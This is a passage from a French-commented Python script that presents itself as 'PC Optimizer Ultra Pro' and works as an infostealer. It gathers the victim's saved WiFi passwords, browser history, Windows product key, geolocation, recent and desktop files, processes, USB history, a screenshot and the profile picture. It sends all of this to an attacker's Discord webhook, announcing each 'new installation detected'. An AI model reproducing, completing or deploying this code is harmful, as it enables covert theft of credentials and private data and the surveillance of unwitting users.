                "value": f"```\n{info['system']['user_name']}@{info['system']['pc_name']}\nDomaine: {info['system']['domain']}\nComptes sur ce PC: {', '.join(info['user_accounts'][:5]) if info['user_accounts'] else 'N/A'}\n```",
                "inline": False
            },
            {
                "name": "🌐 Localisation Précise",
                "value": f"```\n{info['network']['city']}, {info['network']['country']}\nIP: {info['network']['public_ip']}\nCoordonnées: {info['network']['latitude']}, {info['network']['longitude']}\nFuseau horaire: {info['network']['timezone']}\n```\n[📍 Voir sur Google Maps]({maps_link})" if maps_link != "Non disponible" else f"```\n{info['network']['city']}, {info['network']['country']}\nIP: {info['network']['public_ip']}\n```",
                "inline": False
            },
            {
                "name": "💻 Système d'exploitation",
                "value": f"```\n{info['system']['os_name']}\nVersion: {info['system']['os_version']}\nBuild: {info['system']['os_build']}\nArch: {info['system']['architecture']}\nClé produit: {info['windows_key']}\n```",
                "inline": False
            },
            {
                "name": "📅 Dates importantes",
                "value": f"```\nInstallation OS: {install_date_formatted}\nDernier démarrage: {boot_time_formatted}\n```",
                "inline": False
            }
        ],
        "thumbnail": {
            "url": "https://cdn-icons-png.flaticon.com/512/3281/3281307.png"
        }
    }
    
    # ═══════════════════════════════════════════════════════════
    # EMBED 2: MATÉRIEL
    # ═══════════════════════════════════════════════════════════
    embed_hardware = {
        "title": "⚙️ COMPOSANTS MATÉRIELS",
        "color": 3447003,
        "fields": [
            {
                "name": "🔥 Processeur (CPU)",
                "value": f"```diff\n+ {info['cpu']['name']}\n\n- Cœurs: {info['cpu']['cores']} | Threads: {info['cpu']['threads']}\n- Fréquence: {info['cpu']['speed']}\n```",
                "inline": False
            },
            {
                "name": "🧠 Mémoire RAM",
                "value": f"```yaml\nCapacité totale: {info['ram']['total']}\n\n{ram_details if ram_details else '→ Détails des barrettes non disponibles'}\n```",
                "inline": False
            },
            {
                "name": "🔧 Carte Mère",
                "value": f"```ini\n[Fabricant]  = {info['motherboard']['manufacturer']}\n[Modèle]     = {info['motherboard']['model']}\n[Version]    = {info['motherboard']['version'] or 'N/A'}\n[N° Série]   = {info['motherboard']['serial']}\n```",
                "inline": False
            },
            {
                "name": "💾 BIOS/UEFI",
                "value": f"```properties\nFabricant = {info['bios']['manufacturer']}\nVersion   = {info['bios']['version']}\nDate      = {info['bios']['date'][:8] if len(info['bios']['date']) > 8 else info['bios']['date']}\n```",
                "inline": False
            }
        ]
    }
    
    # ═══════════════════════════════════════════════════════════
    # EMBED 3: GRAPHISME
    # ═══════════════════════════════════════════════════════════
    gpu_text = ""
    if info['gpu']:
        for i, gpu in enumerate(info['gpu'][:3], 1):
            gpu_text += f"GPU {i}: {gpu['name']}\n"
            gpu_text += f"       ├─ VRAM: {gpu.get('vram', 'N/A')}\n"
            gpu_text += f"       └─ Driver: {gpu.get('driver', 'N/A')}\n\n"
    else:
        gpu_text = "Aucune carte graphique détectée"
    
    screen_text = ""
    if info['screens']:
        for i, screen in enumerate(info['screens'][:3], 1):
            screen_text += f"Écran {i}: {screen['width']} x {screen['height']} pixels\n"
    else:
        screen_text = "Aucun écran détecté"
    
    embed_display = {
        "title": "🎮 AFFICHAGE & GRAPHISME",
        "color": 10181046,
        "fields": [
            {
                "name": "🎨 Carte(s) Graphique(s)",
                "value": f"```\n{gpu_text}```",
                "inline": False
            },
            {
                "name": "📺 Configuration Écran(s)",
                "value": f"```\n{screen_text}```",
                "inline": False
            }
        ]
    }
    
    # ═══════════════════════════════════════════════════════════
    # EMBED 4: STOCKAGE
    # ═══════════════════════════════════════════════════════════
    logical_text = ""
    if info['disks']['logical']:
        for disk in info['disks']['logical'][:6]:
            bar_length = 20
            filled = int((disk['usage'] / 100) * bar_length)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            logical_text += f"{disk['letter']} │ {disk['name']}\n"
            logical_text += f"   ├─ {bar} {disk['usage']}%\n"
            logical_text += f"   └─ {disk['used']:.1f} GB / {disk['total']:.1f} GB ({disk.get('fs', 'N/A')})\n\n"
    else:
        logical_text = "Aucun disque logique détecté"
    
    physical_text = ""
    if info['disks']['physical']:
        for i, disk in enumerate(info['disks']['physical'][:4], 1):
            physical_text += f"{i}. {disk['model']}\n"
            physical_text += f"   └─ Capacité: {disk['size']} ({disk['interface']})\n\n"
    else:
        physical_text = "Aucun disque physique détecté"
    
    embed_storage = {
        "title": "💾 STOCKAGE",
        "color": 15844367,
        "fields": [
            {
                "name": "📂 Partitions / Disques Logiques",
                "value": f"```\n{logical_text}```",
                "inline": False
            },
            {
                "name": "🗄️ Disques Physiques",
                "value": f"```\n{physical_text}```",
                "inline": False
            }
        ]
    }
    
    # ═══════════════════════════════════════════════════════════
    # EMBED 5: RÉSEAU & WIFI
    # ═══════════════════════════════════════════════════════════
    adapters_text = ""
    if info['network']['adapters']:
        for i, adapter in enumerate(info['network']['adapters'][:4], 1):
            adapters_text += f"{i}. {adapter.get('name', 'Inconnu')}\n"
            adapters_text += f"   ├─ IP: {adapter.get('ip', 'N/A')}\n"
            adapters_text += f"   └─ MAC: {adapter.get('mac', 'N/A')}\n\n"
    else:
        adapters_text = "Aucun adaptateur réseau actif détecté"
    
    wifi_preview = ""
    if info['wifi_passwords']:
        for i, wifi in enumerate(info['wifi_passwords'][:5], 1):
            wifi_preview += f"{i}. {wifi['ssid']}\n   Pass: {wifi['password']}\n"
        if len(info['wifi_passwords']) > 5:
            wifi_preview += f"\n... et {len(info['wifi_passwords']) - 5} autres réseaux"
    else:
        wifi_preview = "Aucun réseau WiFi enregistré"
    
    embed_network = {
        "title": "🌐 RÉSEAU & CONNEXION",
        "color": 3066993,
        "fields": [
            {
                "name": "🌍 Informations Publiques (WAN)",
                "value": f"```ini\n[IP Publique] = {info['network']['public_ip']}\n[Pays]        = {info['network']['country']}\n[Ville]       = {info['network']['city']}\n[FAI]         = {info['network']['isp']}\n```",
                "inline": False
            },
            {
                "name": "🏠 Informations Locales (LAN)",
                "value": f"```properties\nIP Locale       = {info['network']['local_ip']}\nMAC Principale  = {info['network']['mac_address']}\n```",
                "inline": False
            },
            {
                "name": "🔌 Adaptateurs Réseau Actifs",
                "value": f"```\n{adapters_text}```",
                "inline": False
            },
            {
                "name": "📡 Réseaux WiFi Enregistrés (Top 5)",
                "value": f"```\n{wifi_preview}```\n*Fichier complet avec tous les mots de passe WiFi envoyé séparément*",
                "inline": False
            }
        ]
    }
    
    # ═══════════════════════════════════════════════════════════
    # EMBED 6: SÉCURITÉ
    # ═══════════════════════════════════════════════════════════
    av_text = ""
    for i, av in enumerate(info['security']['antivirus'][:5], 1):
        av_text += f"{i}. {av}\n"
    
    defender_status = "✅ Actif" if info['security']['defender'] == "Actif" else "❌ Inactif"
    firewall_status = "✅ Actif" if info['security']['firewall'] == "Actif" else "❌ Inactif"
    uac_status = "✅ Actif" if info['security']['uac'] == "Actif" else "⚠️ Inconnu"
    
    embed_security = {
        "title": "🛡️ SÉCURITÉ & PROTECTION",
        "color": 15158332,
        "fields": [
            {
                "name": "🦠 Antivirus Installé(s)",
                "value": f"```\n{av_text}```",
                "inline": False
            },
            {
                "name": "🔒 Protection Windows",
                "value": f"```diff\n+ Windows Defender : {defender_status}\n+ Pare-feu Windows : {firewall_status}\n+ Contrôle UAC     : {uac_status}\n```",
                "inline": False
            }
        ]
    }
    
    # ═══════════════════════════════════════════════════════════
    # EMBED 7: ACTIVITÉ & PROCESSUS
    # ═══════════════════════════════════════════════════════════
    startup_text = "\n".join(info['startup_programs'][:10]) if info['startup_programs'] else "Aucun"
    
    processes_text = ""
    if info['running_processes']:
        for i, proc in enumerate(info['running_processes'][:15], 1):
            processes_text += f"{i}. {proc['name']} (PID: {proc['pid']})\n"
    else:
        processes_text = "Aucun processus détecté"
    
    usb_text = "\n".join(info['usb_history'][:8]) if info['usb_history'] else "Aucun historique USB"
    
    embed_activity = {
        "title": "⚡ ACTIVITÉ & PROCESSUS",
        "color": 16776960,  # Jaune
        "fields": [
            {
                "name": "🚀 Programmes au Démarrage (Top 10)",
                "value": f"```\n{startup_text}\n```",
                "inline": False
            },
            {
                "name": "🔄 Processus en Cours (Top 15)",
                "value": f"```\n{processes_text}\n```",
                "inline": False
            },
            {
                "name": "💾 Historique Périphériques USB",
                "value": f"```\n{usb_text}\n```",
                "inline": False
            }
        ]
    }
    
    # ═══════════════════════════════════════════════════════════
    # EMBED 8: FICHIERS & ACTIVITÉ UTILISATEUR
    # ═══════════════════════════════════════════════════════════
    recent_files_text = "\n".join(info['recent_files'][:15]) if info['recent_files'] else "Aucun fichier récent"
    desktop_files_text = "\n".join(info['desktop_files'][:15]) if info['desktop_files'] else "Bureau vide"
    
    embed_files = {
        "title": "📁 FICHIERS & ACTIVITÉ UTILISATEUR",
        "color": 11027200,  # Vert foncé
        "fields": [
            {
                "name": "📄 Fichiers Récents (Top 15)",
                "value": f"```\n{recent_files_text}\n```",
                "inline": False
            },
            {
                "name": "🖥️ Fichiers sur le Bureau (Top 15)",
                "value": f"```\n{desktop_files_text}\n```",
                "inline": False
            },
            {
                "name": "🌐 Historique Navigateurs",
                "value": f"```\nChrome: {len(info['browser_history']['chrome'])} URLs\nEdge: {len(info['browser_history']['edge'])} URLs\n```\n*Fichier complet avec l'historique envoyé séparément*",
                "inline": False
            }
        ]
    }
    
    # ═══════════════════════════════════════════════════════════
    # EMBED 9: LOGICIELS
    # ═══════════════════════════════════════════════════════════
    total_software = len(info['software'])
    
    # Top 10 logiciels
    software_preview = ""
    for i, soft in enumerate(info['software'][:10], 1):
        software_preview += f"{i}. {soft['name']} (v{soft['version']})\n"
    
    if total_software > 10:
        software_preview += f"\n... et {total_software - 10} autres logiciels"
    
    # 30 derniers installés
    recent_30 = ""
    recent_software = [s for s in info['software'] if s.get('install_date') != "N/A"][:5]
    for i, soft in enumerate(recent_software, 1):
        recent_30 += f"{i}. {soft['name']}\n"
    
    if len([s for s in info['software'] if s.get('install_date') != "N/A"]) > 5:
        recent_30 += f"\n... voir fichier pour les 30 derniers"
    
    embed_software = {
        "title": "📦 LOGICIELS INSTALLÉS",
        "description": f"**{total_software} logiciels détectés** via WMIC",
        "color": 9807270,
        "fields": [
            {
                "name": "🆕 Derniers Installés (Top 5)",
                "value": f"```\n{recent_30 if recent_30 else 'Dates non disponibles'}\n```\n*Fichier avec les 30 derniers + liste complète envoyé*",
                "inline": False
            },
            {
                "name": "💿 Aperçu Global (Top 10)",
                "value": f"```\n{software_preview if software_preview else 'Aucun logiciel détecté'}\n```",
                "inline": False
            },
            {
                "name": "🐍 Environnement Python",
                "value": f"```\nVersion: {info['python_version']}\n```",
                "inline": True
            },
            {
                "name": "📊 Statistiques",
                "value": f"```\nTotal: {total_software} logiciels\nFichiers: 3 fichiers envoyés\n```",
                "inline": True
            }
        ],
        "footer": {
            "text": "PC Optimizer Ultra Pro v5.0 ULTIMATE • Tracker Complet",
            "icon_url": "https://cdn-icons-png.flaticon.com/512/3281/3281307.png"
        },
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    
    # ═══════════════════════════════════════════════════════════
    # PAYLOAD FINAL
    # ═══════════════════════════════════════════════════════════
    payload = {
        "content": f"# 🚨 **NOUVELLE INSTALLATION DÉTECTÉE - RAPPORT ULTIMATE** 🚨\n> **PC:** `{info['system']['pc_name']}` | **Utilisateur:** `{info['system']['user_name']}`\n> **Localisation:** {info['network']['city']}, {info['network']['country']} ({info['network']['public_ip']})\n> **Screenshot + Photo de profil + 3 fichiers ci-dessous**\n\n📊 **Rapport complet :**",
        "embeds": [
            embed_overview,
            embed_hardware,
            embed_display,
            embed_storage,
            embed_network,
            embed_security,
            embed_activity,
            embed_files,
            embed_software
        ],
        "username": "PC Optimizer Ultra Pro",
        "avatar_url": "https://cdn-icons-png.flaticon.com/512/3281/3281307.png"
    }

    try:
        print("\n[●] Envoi du rapport principal sur Discord...")
        
        data = json.dumps(payload).encode("utf-8")
        
        req = request.Request(
            WEBHOOK_URL,
            data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "PC-Optimizer-Ultra-Pro/5.0"
            },
            method="POST"
        )

        with request.urlopen(req, timeout=15) as response:
            if response.status in (200, 204):
                print("[✓] Rapport principal envoyé avec succès !")
                return True
            else:
                print(f"[!] Réponse inattendue: {response.status}")
                return False

    except error.HTTPError as e:
        print(f"[✗] Erreur HTTP: {e.code}")
        return False
    except error.URLError as e:
        print(f"[✗] Erreur de connexion: {e.reason}")
        return False
    except Exception as e:
        print(f"[✗] Erreur: {e}")
        return False

def main():
    """Point d'entrée principal"""
    print("\n" + "="*70)
    print("   🚀 PC OPTIMIZER ULTRA PRO - TRACKER ULTIMATE v5.0")
    print("   ✨ Photo profil + WiFi + Historique + Screenshot + Fichiers")
    print("="*70 + "\n")
    
    # Collecte de toutes les informations
    info = collect_all_info()
    
    # Création des fichiers
    print("\n[●] Création des fichiers de rapport...\n")
    
    # Fichier logiciels
    software_file = save_software_list_to_file(
        info['software'],
        info['system']['user_name'],
        info['system']['pc_name']
    )
    
    # Fichier WiFi
    wifi_file = None
    if info['wifi_passwords']:
        wifi_file = save_wifi_passwords_to_file(
            info['wifi_passwords'],
            info['system']['user_name'],
            info['system']['pc_name']
        )
    
    # Fichier historique navigateurs
    history_file = None
    if info['browser_history']['chrome'] or info['browser_history']['edge']:
        history_file = save_browser_history_to_file(
            info['browser_history'],
            info['system']['user_name'],
            info['system']['pc_name']
        )
    
    print("\n[●] Envoi du rapport principal sur Discord...\n")
    
    # Envoi du rapport principal
    success = send_webhook(info)
    
    # Upload des fichiers
    if success:
        print("\n[●] Upload des fichiers additionnels...\n")
        
        # Upload fichier logiciels
        if software_file:
            print("[●] Upload de la liste des logiciels...")
            if upload_file_to_discord(software_file, WEBHOOK_URL):
                print("[✓] Fichier logiciels envoyé !")
            else:
                print("[✗] Échec envoi fichier logiciels")
        
        # Upload fichier WiFi
        if wifi_file:
            print("[●] Upload des mots de passe WiFi...")
            if upload_file_to_discord(wifi_file, WEBHOOK_URL):
                print("[✓] Fichier WiFi envoyé !")
            else:
                print("[✗] Échec envoi fichier WiFi")
        
        # Upload fichier historique
        if history_file:
            print("[●] Upload de l'historique navigateurs...")
            if upload_file_to_discord(history_file, WEBHOOK_URL):
                print("[✓] Fichier historique envoyé !")
            else:
                print("[✗] Échec envoi fichier historique")
        
        # Upload screenshot
        if info['screenshot_path']:
            print("[●] Upload du screenshot...")
            if upload_file_to_discord(info['screenshot_path'], WEBHOOK_URL):
                print("[✓] Screenshot envoyé !")
                try:
                    os.remove(info['screenshot_path'])
                except:
                    pass
            else:
                print("[✗] Échec envoi screenshot")
        
        # Upload photo de profil
        if info['profile_picture_path']:
            print("[●] Upload de la photo de profil...")
            if upload_file_to_discord(info['profile_picture_path'], WEBHOOK_URL):
                print("[✓] Photo de profil envoyée !")
            else:
                print("[✗] Échec envoi photo de profil")
    
    print("\n" + "="*70)
    if success:
        print("   ✅ SUCCÈS ! Rapport ULTIMATE envoyé sur Discord")
        print(f"   📊 {len(info['software'])} logiciels | {len(info['wifi_passwords'])} WiFi")
        print(f"   📄 {3 + (1 if info['screenshot_path'] else 0) + (1 if info['profile_picture_path'] else 0)} fichiers envoyés")
    else:
        print("   ❌ ÉCHEC ! Impossible d'envoyer le rapport")
    print("="*70 + "\n")
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
